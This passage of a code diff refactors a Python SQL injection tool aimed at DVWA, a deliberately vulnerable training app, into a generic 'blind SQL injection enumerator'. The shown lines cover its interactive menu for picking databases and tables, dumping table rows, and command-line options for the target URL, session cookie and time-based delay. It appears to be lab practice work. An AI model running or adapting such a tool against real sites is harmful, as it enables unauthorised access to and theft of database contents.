+        for i, (db, tbl) in enumerate(all_tables, 1):
+            print(f"  {i}. {db}.{tbl}")
+        
         try:
-            db_choice = input("\n[?] Select database number (or 'all'): ").strip()
-            
-            if db_choice.lower() == 'all':
-                selected_dbs = databases
-            elif db_choice.isdigit() and 1 <= int(db_choice) <= len(databases):
-                selected_dbs = [databases[int(db_choice) - 1]]
-            else:
-                print("[!] Invalid selection")
-                return
-            
-            # Get tables for selected databases
-            print("\n[4/7] Enumerating tables...")
-            all_tables = []
-            
-            for db in selected_dbs:
-                tables = self.get_tables(db)
-                if tables:
-                    for tbl in tables:
-                        all_tables.append((db, tbl))
-            
-            if not all_tables:
-                print("[!] No tables found")
-                return
-            
-            # Select table
-            print("\n[5/7] Select table:")
-            for i, (db, tbl) in enumerate(all_tables, 1):
-                print(f"  {i}. {db}.{tbl}")
-            
             table_choice = input("\n[?] Select table number: ").strip()
-            
             if table_choice.isdigit() and 1 <= int(table_choice) <= len(all_tables):
-                selected_db, selected_table = all_tables[int(table_choice) - 1]
+                selected_db, selected_table = all_tables[int(table_choice)-1]
                 
                 # Get columns
-                print(f"\n[6/7] Getting columns from '{selected_db}.{selected_table}'...")
+                print(f"\n[5/6] Getting columns from '{selected_db}.{selected_table}'...")
                 columns = self.get_columns(selected_db, selected_table)
                 
                 if columns:
                     # Dump data
-                    print(f"\n[7/7] Dumping data from '{selected_db}.{selected_table}'...")
-                    
-                    limit = input("[?] Number of rows to dump (default: 5): ").strip()
-                    limit = int(limit) if limit.isdigit() else 5
-                    
-                    self.dump_table(selected_db, selected_table, columns, limit)
+                    print(f"\n[6/6] Dumping data from '{selected_db}.{selected_table}'...")
+                    self.dump_data(selected_db, selected_table, columns)
                 else:
                     print("[!] No columns found")
             else:
                 print("[!] Invalid selection")
-        
         except KeyboardInterrupt:
-            print("\n\n[!] Interrupted by user")
-        except Exception as e:
-            print(f"\n[!] Error: {e}")
+            print("\n[!] Interrupted")
         
         print("\n" + "="*60)
-        print("[+] EXPLOITATION COMPLETED")
+        print("[+] ENUMERATION COMPLETED!")
         print("="*60)
-    
-    def test_all_levels(self):
-        """Test all security levels automatically"""
-        print("\n" + "="*60)
-        print("[*] TESTING ALL SECURITY LEVELS")
-        print("="*60)
-        
-        original_level = self.security_level
-        
-        for level in ['low', 'medium', 'high']:
-            print(f"\n\n{'='*40}")
-            print(f"[*] TESTING {level.upper()} SECURITY LEVEL")
-            print(f"{'='*40}")
-            
-            self.security_level = level
-            
-            # Update URLs based on level
-            if level == 'low':
-                self.method = "GET"
-                self.param_type = "query"
-            elif level == 'medium':
-                self.method = "POST"
-                self.param_type = "form"
-            elif level == 'high':
-                self.method = "GET"
-                self.param_type = "session"
-            
-            # Clear tokens
-            self.csrf_token = None
-            self.user_token = None
-            
-            try:
-                # Test vulnerability
-                injection_types = self.detect_injection_type()
-                if injection_types:
-                    print(f"[+] {level.upper()} level is VULNERABLE")
-                    print(f"    Injection types: {', '.join(injection_types)}")
-                else:
-                    print(f"[-] {level.upper()} level is NOT VULNERABLE")
-            
-            except Exception as e:
-                print(f"[!] Error testing {level} level: {e}")
-        
-        # Restore original level
-        self.security_level = original_level
 
 def main():
-    parser = argparse.ArgumentParser(
-        description='DVWA SQL Injection Exploiter - Full Version (All Security Levels)',
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""
-Examples:
-  %(prog)s -u http://localhost/dvwa -s abc123 -l low
-  %(prog)s -u http://192.168.1.100/dvwa -s xyz789 -l medium -t 20
-  %(prog)s -u http://dvwa.test -s sessionid --test-all
-  %(prog)s -u http://localhost:8080/dvwa -s phpsessid -l high --auto
-        
-Note: You need to set DVWA security level manually in the web interface.
-        """
-    )
-    
-    parser.add_argument('-u', '--url', required=True,
-                       help='DVWA base URL (e.g., http://localhost/dvwa)')
-    parser.add_argument('-s', '--session', required=True,
-                       help='PHPSESSID cookie value')
-    parser.add_argument('-l', '--level', default='low',
-                       choices=['low', 'medium', 'high'],
-                       help='DVWA security level (default: low)')
-    parser.add_argument('-t', '--threads', type=int, default=10,
-                       help='Number of threads (default: 10)')
-    parser.add_argument('--test-all', action='store_true',
-                       help='Test all security levels')
-    parser.add_argument('--auto', action='store_true',
-                       help='Auto-detect and exploit without interactive mode')
+    parser = argparse.ArgumentParser(description='Advanced Blind SQL Injection Enumerator')
+    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., http://127.0.0.1:42001)')
+    parser.add_argument('-s', '--session', required=True, help='PHPSESSID value')
+    parser.add_argument('-l', '--level', default='low', choices=['low', 'medium', 'high'], 
+                       help='Security level (default: low)')
+    parser.add_argument('-t', '--threads', type=int, default=15, help='Number of threads (default: 15)')
+    parser.add_argument('-d', '--delay', type=float, default=1.0, help='Delay time for time-based (default: 1.0)')
     
     args = parser.parse_args()
     
-    # Configure cookies
     cookies = {
-        'PHPSESSID': args.session,
-        'security': args.level
+        "PHPSESSID": args.session,
+        "security": args.level
     }
     
     print("""
-╔══════════════════════════════════════════════════════════╗
-║      DVWA SQL INJECTION EXPLOITER - FULL VERSION        ║
-║               Supports: Low, Medium, High               ║
-╚══════════════════════════════════════════════════════════╝
+    ADVANCED BLIND SQL INJECTION ENUMERATOR
+    Supports: Time-based, Boolean-based, Error-based, Union-based
     """)
     
-    print(f"[*] Target: {args.url}")
-    print(f"[*] Session: {args.session}")
-    print(f"[*] Security Level: {args.level.upper()}")
-    print(f"[*] Threads: {args.threads}")
+    # Create enumerator
+    enumerator = BlindSQLiEnumerator(args.url, cookies, threads=args.threads)
+    enumerator.delay_time = args.delay
     
-    try:
-        # Create exploiter instance
-        exploiter = DVWASQLiExploiter(
-            base_url=args.url,
-            cookies=cookies,
-            security_level=args.level,
-            threads=args.threads
-        )
-        
-        if args.test_all:
-            # Test all security levels
-            exploiter.test_all_levels()
-        elif args.auto:
-            # Auto-exploit mode
-            print("\n[*] Starting auto-exploitation...")
-            exploiter.detect_injection_type()
-            exploiter.get_database_info()
-        else:
-            # Interactive mode
-            exploiter.interactive_mode()
-    
-    except KeyboardInterrupt:
-        print("\n\n[!] Exploitation interrupted by user")
-        sys.exit(0)
-    except Exception as e:
-        print(f"\n[!] Critical error: {e}")
-        import traceback
-        traceback.print_exc()
-        sys.exit(1)
+    # Run interactive mode
+    enumerator.interactive_mode()
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n\n[!] Script terminated by user")
+    except Exception as e:
+        print(f"\n[!] Error: {e}")
+        import traceback
+        traceback.print_exc()
